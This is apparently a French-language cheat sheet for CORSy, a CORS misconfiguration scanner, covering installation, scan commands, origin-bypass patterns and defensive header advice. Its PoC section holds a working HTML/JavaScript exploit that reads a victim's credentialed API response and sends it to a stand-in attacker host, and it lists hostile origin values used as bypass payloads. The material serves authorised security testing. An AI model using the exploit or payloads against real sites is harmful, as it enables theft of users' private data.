<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🌐 CORSy - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ██████╗ ███████╗██╗   ██╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗ ██╔╝
  ██║     ██║   ██║██████╔╝███████╗ ╚████╔╝ 
  ██║     ██║   ██║██╔══██╗╚════██║  ╚██╔╝  
  ╚██████╗╚██████╔╝██║  ██║███████║   ██║   
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
      Cross-Origin Resource Sharing (CORS) Misconfiguration Scanner
```
<p align="center">
  <img src="https://img.shields.io/badge/CORSy-CORS_Scanner-blue?style=for-the-badge" alt="CORSy">
  <img src="https://img.shields.io/badge/Author-Somdev_Sangwan-orange?style=for-the-badge" alt="s0md3v">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Sécurité Web">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p align="center">
  <b>🌐 Outil CLI rapide et complet conçu pour détecter les erreurs de configuration du partage de ressources multi-origines (CORS) et tester les risques de vol de données multi-origines</b>
</p>

---

## 📋 Table des matières

- [Présentation et bases de la vulnérabilité CORS](#-overview--cors-vulnerability-basics)
  - [Le Trio Fatal : Réflexion d'origine + Credentials True](#the-fatal-trio-origin-reflection--credentials-true)
- [Installation](#-installation)
- [Analyse cible de base](#-basic-target-scanning)
- [Vecteurs d'attaque CORS testés] (#-cors-attack-vectors-tested)
  - [Réflexion sur l'origine arbitraire](#arbitrary-origin-reflection)
  - [Trusting Null Origin (`Origin: null`)](#trusting-null-origin-origin-null)
  -[Préfixe et suffixe Regex Bypass](#prefix--suffix-regex-bypass)
  - [Confiance du sous-domaine Wildcard](#wildcard-subdomain-trust)
  - [Contournement des caractères spéciaux (`_`, `;`, `!`)](#special-character-bypass----)
- [Analyse multi-cibles et exportation de sortie](#-multi-target-scanning--output-export)
- [Exploits de preuve de concept (PoC) de création](#-crafting-proof-of-concept-poc-exploits)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et en-têtes sécurisés](#-defensive-considerations--secure-headers)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et bases de la vulnérabilité CORS

Le **Cross-Origin Resource Sharing (CORS)** est un mécanisme de sécurité du navigateur qui permet aux serveurs Web d'assouplir la **Same-Origin Policy (SOP)**. En renvoyant des en-têtes tels que :
-`Access-Control-Allow-Origin: <origin>`
-`Access-Control-Allow-Credentials: true`

Une application Web accorde à d'autres sites Web l'autorisation de lire ses réponses HTTP au nom de l'utilisateur victime.

### Le Trio Fatal : Réflexion sur l'origine + Informations d'identification vraies
Lorsqu'une application reflète aveuglément l'en-tête `Origin` entrant dans `Access-Control-Allow-Origin` et active `Access-Control-Allow-Credentials: true`, tout site Web malveillant peut forcer le navigateur d'un visiteur authentifié à lire les messages privés, les clés API et les détails du compte.

Créé par **Somdev Sangwan (s0md3v)**, **CORSy** sonde systématiquement les points de terminaison avec plus de 16 permutations d'origine connues pour repérer ces erreurs de configuration.

---

## 📥Installation
```bash
# Clone the repository
git clone https://github.com/s0md3v/Corsy.git
cd Corsy

# Install dependencies
pip install -r requirements.txt

# Run Corsy
python3 corsy.py -h
```
---

## 🚀 Analyse de cible de base

Analyser un seul point de terminaison d'application Web :
```bash
python3 corsy.py -u https://target.com/api/user/details
```
Ajoutez des en-têtes personnalisés ou des cookies de session :
```bash
python3 corsy.py -u https://target.com/api/user/details \
  --headers "Cookie: session=abc123xyz"
```
---

## ⚡ Vecteurs d'attaque CORS testés

CORSy teste automatiquement plusieurs modèles de permutation d'origine :

### Réflexion sur l'origine arbitraire
Le serveur reflète aveuglément n'importe quel domaine :
```http
Request:
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
### Faire confiance à Null Origin (`Origin: null`)
Les applications peuvent faire confiance aux origines `null` (communes avec les iframes locales en bac à sable ou les URL `data:`) :
```http
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
*Peut être déclenché en chargeant l'API de la victime à partir d'une iframe avec `sandbox="allow-scripts allow-top-navigation"`.*

### Contournement des préfixes et suffixes Regex
Mauvaise validation des expressions régulières (par exemple `.*target.com` ou `target.com.*`) :
-`https://target.com.attacker.com`
-`https://not-target.com`

### Contournement des caractères spéciaux (`_`, `;`, `!`)
Les navigateurs et les serveurs gèrent les délimiteurs d'URI différemment :
-`https://target.com_.attacker.com`
-`https://target.com%60.attacker.com`

---

## 🌐 Analyse multi-cibles et exportation de sortie

Analysez de grandes listes de points de terminaison d'API découverts lors de la reconnaissance :
```bash
# Scan a list of URLs with 10 concurrent threads
python3 corsy.py -i endpoints.txt -t 10

# Export results to clean JSON format
python3 corsy.py -i endpoints.txt -o cors_results.json
```
---

## 💻 Création d'exploits de preuve de concept (PoC)

Lorsque CORSy confirme une mauvaise configuration avec les informations d'identification autorisées, générez un exploit HTML pour voler des données sensibles :
```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS Exploit Demo</h1>
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        // Exfiltrate stolen private response to attacker server
        fetch("https://attacker.com/log?data=" + encodeURIComponent(this.responseText));
    };
    req.open("GET", "https://target.com/api/user/private_data", true);
    req.withCredentials = true; // Crucial for sending session cookies
    req.send();
</script>
</body>
</html>
```
---

## ⚡ Tableau de référence rapide

| Objectif | Commande |
|-----------|---------|
| **Analyser une URL unique** | `python3 corsy.py -u <URL>` |
| **Scanner avec le cookie de session** | `python3 corsy.py -u <URL> --headers "Cookie: sess=123"` |
| **Liste d'URL de numérisation** | `python3 corsy.py -i targets.txt` |
| **Analyse multithread** | `python3 corsy.py -i targets.txt -t 20` |
| **Exporter vers JSON** | `python3 corsy.py -i targets.txt -o results.json` |

---

## 🛡️ Considérations défensives et en-têtes sécurisés

1. **Ne jamais refléter l'origine de manière arbitraire :** Comparez l'en-tête `Origin` à une liste blanche explicite et stricte côté serveur.
2. **Ne jamais associer un caractère générique avec des informations d'identification :** Le navigateur bloque `Access-Control-Allow-Origin: *` avec `Credentials: true`, mais ne l'émule jamais de manière dynamique.
3. **Évitez de faire confiance à `null` :** N'ajoutez pas `null` aux stratégies d'origine approuvées.

---

## ⚠️ Mentions légales

> [!ATTENTION]
> CORSy est strictement destiné aux évaluations de sécurité autorisées, aux tests d'intrusion et aux audits défensifs. Tester des sites Web sans autorisation est illégal.